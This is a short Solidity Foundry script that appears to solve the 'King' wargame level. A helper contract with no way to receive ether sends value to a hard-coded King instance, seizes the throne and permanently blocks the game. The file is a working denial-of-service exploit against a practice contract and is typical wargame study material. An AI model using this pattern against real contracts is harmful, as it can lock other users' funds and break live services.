// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { King } from "../src/King.sol";

contract SendAndDisappear {
    constructor () payable {
        address target = payable(0x51BC48A9965375Ab597feFC9bb428D6063F8aAb3);
        target.call{value: 1000000000000000 wei}("");
    }
}

contract KingSolver is Script {

    King public instance = King(payable(0x51BC48A9965375Ab597feFC9bb428D6063F8aAb3));

	uint256 prv = vm.envUint("PRV");
	address pub = vm.envAddress("PUB");

    function run() external {
        vm.startBroadcast(prv);
        
        bytes32 king;
        king = vm.load(address(instance), 0);
        new SendAndDisappear{value: 1000000000000000 wei}();
        king = vm.load(address(instance), 0);


        vm.stopBroadcast();
    }

}


